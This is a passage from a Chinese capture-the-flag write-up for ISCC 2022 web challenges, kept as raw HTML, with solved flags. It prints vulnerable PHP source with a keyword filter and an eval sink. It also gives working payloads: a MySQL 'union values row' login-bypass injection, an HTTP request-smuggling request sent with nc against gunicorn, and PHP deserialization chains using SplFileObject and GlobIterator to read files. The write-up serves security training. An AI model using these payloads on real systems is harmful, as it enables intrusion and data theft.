alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-3U3o6XLt-1654502690035)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e56f0a1d-6fe3-4e5c-9259-59faf3803511/9G7QXNDWLFDOHTJZSSL.png)]\" src=\"image\\c0eaa53903014af09da789651fbb634c.png\"/></p>\n<p>解码即可：</p>\n<p>ISCC{P0p_Zi_aNd_P1p_Mei_Da1ly_life_2022}</p>\n<h3><a id=\"EasySQL_327\"></a><strong>Easy-SQL</strong></h3>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">?</span>id<span class=\"token operator\">=</span><span class=\"token number\">8</span>   <span class=\"token comment\">//出现回显，猜测可能是Mysql8</span>\n</code></pre>\n<p><img alt=\"[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-nLipWquX-1654502690035)(https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d56a3704-2f38-4f09-b3f2-79780bf325d5/Untitled.png)]\" src=\"image\\344f3ed6a7e343ef90a6b9acfe39afbf.png\"/></p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">?</span>id<span class=\"token operator\">=</span><span class=\"token number\">8</span> union table emails limit <span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token operator\">--</span><span class=\"token operator\">+</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\ae7ed88694a04c1ab2ea373cfc5cea25.png\"/></p>\n<p>访问压缩包下载</p>\n<p>得到源码：</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span> <span class=\"token string double-quoted-string\">\"./config.php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// error_reporting(0);</span>\n<span class=\"token comment\">// highlight_file(__FILE__);</span>\n<span class=\"token variable\">$conn</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$hostname</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$database</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">connect_errno</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Connection failed: \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$conn</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">connect_errno</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> \n\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Where is the database?\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"try ?id\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">sqlWaf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$filter</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|&gt;|&lt;|;|\"|\\^|\\||\\ |\\'/i'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filter</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">False</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">True</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$id</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select * from users where id=<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$safe</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/select/is'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$safe</span><span class=\"token operator\">!==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"No select!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span> \n    <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3&gt;\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;/h3&gt;&lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h3&gt;\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"&lt;/h3&gt;\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&lt;br&gt;Error!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">{<!-- --></span>\n\n    <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token function\">strval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$passwd</span> <span class=\"token operator\">=</span> <span class=\"token function\">strval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token function\">sqlWaf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$passwd</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'damn hacker'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE username='${username}' AND passwd= '${passwd}'\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$conn</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">num_rows</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$result</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">fetch_assoc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'admin'</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'passwd'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$passwd</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"username or passwd wrong, are you admin?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"wrong user\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"user not exist or wrong passwd\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>这里之前可以判断一共是3列</p>\n<p>三列内容：id，username，password</p>\n<p>满足username=admin并且password=password</p>\n<pre><code class=\"prism language-php\">username<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>' union values <span class=\"token function\">row</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"ki10Moc\"</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#&amp;passwd=ki10Moc</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\614f3ecd97f84873b49adcd42f1ca272.png\"/></p>\n<p>ISCC{Fdsfs219_19FdFasVEsd0f158_T0o_SFFsd12156fs_m1}</p>\n<h3><a id=\"_434\"></a><strong>让我康康！</strong></h3>\n<p>发现提示Try flag</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\e98706432cee4869baed939b40d57b09.png\"/></p>\n<p>但是无查询结果</p>\n<p>发现服务器是gunicorn20.0.0</p>\n<p>想到请求走私</p>\n<p><a href=\"https://www.linuxlz.com/aqld/2359.html\">gunicorn 20.0.4 请求走私漏洞简析（含复现环境&amp;Poc）-Linux实验室 (linuxlz.com)</a></p>\n<p>直接打</p>\n<pre><code class=\"prism language-php\"><span class=\"token keyword\">echo</span> <span class=\"token operator\">-</span>en <span class=\"token string double-quoted-string\">\"GET / HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\nContent-Length: 123\\r\\nSec-Websocket-Key1: x\\r\\n\\r\\nxxxxxxxxGET /fl4g HTTP/1.1\\r\\nHost: 127.0.0.1/fl4g\\r\\nX-Forwarded-For: 127.0.0.1\\r\\nsecr3t_ip: 127.0.0.1\\r\\nContent-Length: 35\\r\\n\\r\\nGET / HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n\"</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">nc</span> <span class=\"token number\">59.110</span><span class=\"token number\">.159</span><span class=\"token number\">.206</span> <span class=\"token number\">7020</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\b968b5b6fcc34ea3ba80028bb8d84edd.png\"/></p>\n<p>ISCC{AWEIweiwwwweeeiii_JJj9JJGg5GGG_NONONONO2022}</p>\n<h3><a id=\"findme_460\"></a><strong>findme</strong></h3>\n<p><a href=\"https://www.anquanke.com/post/id/264823\">浅析PHP原生类 - 安全客，安全资讯平台 (anquanke.com)</a></p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">a</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$un0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$un1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$un2</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$un3</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$un4</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">un0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">un2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$this</span> <span class=\"token operator\">-&gt;</span> <span class=\"token function\">Givemeanew</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span> <span class=\"token operator\">-&gt;</span> <span class=\"token property\">un3</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'unserialize'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token variable\">$this</span> <span class=\"token operator\">-&gt;</span> <span class=\"token function\">yigei</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token variable\">$this</span> <span class=\"token operator\">-&gt;</span> <span class=\"token function\">giao</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">Givemeanew</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span> <span class=\"token operator\">-&gt;</span> <span class=\"token property\">un4</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">un0</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span> <span class=\"token operator\">-&gt;</span> <span class=\"token property\">un1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">yigei</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Your output: '</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">un4</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">giao</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">un2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">include</span> <span class=\"token variable\">$this</span> <span class=\"token operator\">-&gt;</span> <span class=\"token property\">un2</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'hint.php'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'data'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>其中我在文章这里提到的一个小trick</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\ae3e72cf5dc04eb2a0c8433b622a247f.png\"/></p>\n<p>再来看看源码，此处可以实现原生类的自声明和调用</p>\n<pre><code class=\"prism language-php\"><span class=\"token variable\">$this</span> <span class=\"token operator\">-&gt;</span> <span class=\"token property\">un4</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">un0</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span> <span class=\"token operator\">-&gt;</span> <span class=\"token property\">un1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>__wakeup()中可以查看hint.php，那就先看一下hint.php</p>\n<p>当然这是我最开始的写法，挺麻烦的，应该不是出题人的意思</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">a</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$un0</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'SplFileObject'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$un1</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'php://filter/read=convert.base64-encode/resource=hint.php'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$un2</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$un3</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'unserialize'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$un4</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>按照出题人的意思应该这么写</p>\n<pre><code class=\"prism language-python\"><span class=\"token operator\">&lt;</span>?php\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">a</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    public $un0<span class=\"token punctuation\">;</span>\n    public $un1<span class=\"token punctuation\">;</span>\n    public $un2 <span class=\"token operator\">=</span> <span class=\"token string\">'php://filter/read=convert.base64-encode/resource='</span><span class=\"token punctuation\">;</span>\n    public $un3<span class=\"token punctuation\">;</span>\n    public $un4<span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">}</span>\n\necho serialize<span class=\"token punctuation\">(</span>new a<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>这样就可以直接读取hint.php，不需要去看前面的if，直接执行的</p>\n<p>得到信息</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?</span><span class=\"token class-name type-declaration\">php</span><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'flag在当前目录下以字母f开头的txt中,无法爆破出来'</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>下面就是找这样的文件</p>\n<p>可以用**<a href=\"https://www.php.net/manual/zh/class.directoryiterator.php\">Directorylterator</a>也可以用<a href=\"https://www.php.net/manual/zh/class.filesystemiterator.php\">Filesystemlterator</a>**</p>\n<p>当然最好是使用**<a href=\"https://www.php.net/manual/zh/class.globiterator.php\">Globlterator</a>，行为类似glob()**</p>\n<p>在网上看到的一些在**<a href=\"https://www.php.net/manual/zh/class.globiterator.php\">Globlterator</a>**下依然使用glob协议去读文件就挺….没必要的</p>\n<pre><code class=\"prism language-python\"><span class=\"token operator\">&lt;</span>?php\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">a</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    public $un0 <span class=\"token operator\">=</span> <span class=\"token string\">'GlobIterator'</span><span class=\"token punctuation\">;</span>\n    public $un1 <span class=\"token operator\">=</span> <span class=\"token string\">'f*.txt'</span><span class=\"token punctuation\">;</span>\n    public $un2<span class=\"token punctuation\">;</span>\n    public $un3 <span class=\"token operator\">=</span> <span class=\"token string\">'unserialize'</span><span class=\"token punctuation\">;</span>\n    public $un4<span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">}</span>\n\necho serialize<span class=\"token punctuation\">(</span>new a<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>得到</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\19ba3704f81e4e89b142955ded4dfc98.png\"/></p>\n<p>那最后再去读这个文件即可</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">a</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$un0</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'SplFileObject'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$un1</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'fSSSbis19k_sdW15dMe.txt'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$un2</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$un3</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'unserialize'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$un4</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<pre><code class=\"prism language-php\"><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{<!-- --></span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"un0\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">13</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"SplFileObject\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"un1\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">23</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"fSSSbis19k_sdW15dMe.txt\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"un2\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">N</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"un3\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">11</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"unserialize\"</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"un4\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">N</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\21150327cfab4a5ebbac73d5e6fc216d.png\"/></p>\n<p>ISCC{DS19sdw_SssfDA10nK_2077yyyyNNNN}</p>\n<h3><a 